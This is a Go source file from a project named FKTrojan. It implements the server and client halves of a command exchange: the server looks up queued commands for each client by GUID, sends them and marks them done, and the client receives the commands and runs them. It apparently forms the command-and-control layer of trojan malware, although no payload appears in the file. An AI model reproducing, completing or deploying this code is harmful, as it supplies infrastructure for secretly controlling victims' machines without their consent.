package service_command

import (
	"FKTrojan/dao"
	"FKTrojan/database"
	. "FKTrojan/flog"
	"encoding/gob"
	"io"
)

type cmdHandler func(*dao.Command, *dao.Client) error

// 这里所有数据是明文
// 不用考虑解密问题
func ServerHandler(r io.Reader, w io.Writer, handler cmdHandler) error {
	gobDecoder := gob.NewDecoder(r)
	gobEncoder := gob.NewEncoder(w)
	var client dao.Client
	err := gobDecoder.Decode(&client)
	if err != nil {
		Flog.Printf("decoder error %v\n", err)
		return err
	}
	//fmt.Printf("client uid is %v\n", auth)
	cmd, err := database.GetNewCmd(client.GUID)
	if err != nil {
		cmd = dao.IdleCommand(client.GUID)
	} else {
		database.SetPath(cmd)
		database.SetCmdDoing(cmd)
	}
	err = handler(cmd, &client)
	if err != nil {
		return err
	}
	//Flog.Printf("send cmd %s\n", cmd.String())
	gobEncoder.Encode(cmd)
	var endFlag int
	err = gobDecoder.Decode(&endFlag)
	if err != nil {
		return err
	}
	if cmd.Code != dao.CMD_IDLE {
		Flog.Printf("send cmd %s\n", cmd.String())
	}
	//fmt.Printf("after set cmd done cmd is %s\n", cmd.String())
	err = gobEncoder.Encode(endFlag)
	if err != nil {
		return err
	}
	//fmt.Printf("before set cmd done cmd is %s\n", cmd.String())
	if cmd.Code != dao.CMD_IDLE {
		err = database.SetCmdDone(cmd)
		if err != nil {
			return err
		}
	}
	return nil
}

func ClientHandler(r io.Reader, w io.Writer, handler cmdHandler) error {
	gobDecoder := gob.NewDecoder(r)
	gobEncoder := gob.NewEncoder(w)
	client := dao.NewClient()
	err := gobEncoder.Encode(client)
	if err != nil {
		return err
	}
	var cmd dao.Command
	err = gobDecoder.Decode(&cmd)
	if err != nil {
		return err
	}
	//fmt.Printf("receive cmd %+v\n", cmd)
	//err = command.ClientDo(&cmd)
	err = handler(&cmd, client)
	if err != nil {
		return err
	}
	var endFlag int = 1
	err = gobEncoder.Encode(endFlag)
	if err != nil {
		return err
	}
	err = gobDecoder.Decode(&endFlag)
	if err != nil {
		return err
	}
	return err
}
